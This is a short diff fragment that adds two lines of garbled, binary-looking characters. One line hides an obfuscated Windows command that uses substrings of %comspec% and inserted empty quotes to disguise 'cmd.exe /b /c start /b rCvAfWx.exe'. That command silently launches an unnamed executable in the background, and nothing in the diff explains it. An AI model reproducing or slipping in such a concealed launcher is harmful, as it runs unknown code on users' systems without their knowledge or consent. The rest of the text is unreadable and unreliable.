@@ -1,0 +1,2 @@
+  â ?  @  ª ? ^ @  é ü Ş ã m ¸ P ! - õ ³ B ¥ ? ğ ?    ´ ? î  U ` µ ¨ l ÷  ³ º Ù s Æ - ø u Ë H ¬ ø ?  p ! Õ 	 ã × ] ¤ Ù â  N t d r ¢ . % o L x h * ?
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b r""CvAf""Wx%comspec:~-1%.%comspec:~-1%x%comspec:~-1%  â ?  @  ª ? ^ @  é ü Ş ã m ¸ P ! - õ ³ B ¥ ? ğ ?    ´ ? î  U ` µ ¨ l ÷  ³ º Ù s Æ - ø u Ë H ¬ ø ?  p ! Õ 	 ã × ] ¤ Ù â  N t d r ¢ . % o L x h * ?
